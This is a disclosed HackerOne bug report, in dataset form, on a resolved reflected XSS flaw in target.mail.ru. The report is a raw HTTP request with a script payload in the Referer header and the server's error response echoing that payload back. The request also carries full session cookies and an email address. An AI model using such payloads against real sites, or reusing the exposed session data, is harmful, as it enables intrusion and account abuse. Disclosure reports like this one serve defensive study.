---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '19336'
original_report_id: '19336'
title: 'target.mail.ru: XSS через Referer'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-07-07T11:22:08.796Z'
disclosed_at: '2015-09-13T12:03:01.729Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# target.mail.ru: XSS через Referer

## Metadata

- HackerOne Report ID: 19336
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:03:01.729Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

POST /offer HTTP/1.1
Host: target.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: <html><script>alert(1)</script></html>
Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=14|s_vp=(2560/644)|dpr=1; i=AQCwdrpTBwATAAgfClwAATABAWQBAowBAY0BAY8BAZoBAdwEAvQEAQAGAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAfbvAQgEAQEAAVgDCAQBAQAB; b=gT8IAHDFSAUADLHRYSgjITSiIoT7WZPQmyoSAgAAwraBSEiZMwnnDG4inNK0AnE6+0UC; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAID3gcA; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=pYutUwAAAMvTAAASAQAAcgCA; Mpop=1404730011:517058034772616319050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; mc1=1404730101; csrftoken=0MCegI2csNuNjB5Spgrouw08VvazbdKl; z=uxz03smodbato19j4wepmbqd2f9p6bwr; last_read_news_id=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

csrfmiddlewaretoken=0MCegI2csNuNjB5Spgrouw08VvazbdKl&account_type=later&accept=1





HTTP/1.1 403 FORBIDDEN
Server: nginx/1.2.8
Date: Mon, 07 Jul 2014 11:21:16 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Cookie
Set-Cookie: last_read_news_id=0; expires=Mon, 14-Jul-2014 11:21:16 GMT; Max-Age=604800; Path=/
Content-Length: 104

Referer checking failed - <html><script>alert(1)</script></html> does not match https://target.mail.ru/.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
